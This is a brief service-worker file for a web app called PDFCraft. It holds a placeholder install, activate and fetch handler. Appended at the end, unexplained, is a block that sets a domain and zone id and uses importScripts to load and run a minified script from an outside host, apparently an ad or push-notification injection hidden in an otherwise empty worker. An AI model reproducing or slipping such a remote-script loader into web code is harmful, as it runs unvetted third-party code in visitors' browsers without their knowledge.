/**
 * Service Worker for PDFCraft
 */

const CACHE_NAME = 'pdfcraft-cache-v1';

self.addEventListener('install', (event) => {
    self.skipWaiting();
});

self.addEventListener('activate', (event) => {
    event.waitUntil(clients.claim());
});

self.addEventListener('fetch', (event) => {
    // Simple pass-through for now to avoid errors
    // In a real PWA, caching logic would go here
});


self.options = {
    "domain": "3nbf4.com",
    "zoneId": 10455279
}
self.lary = ""
importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
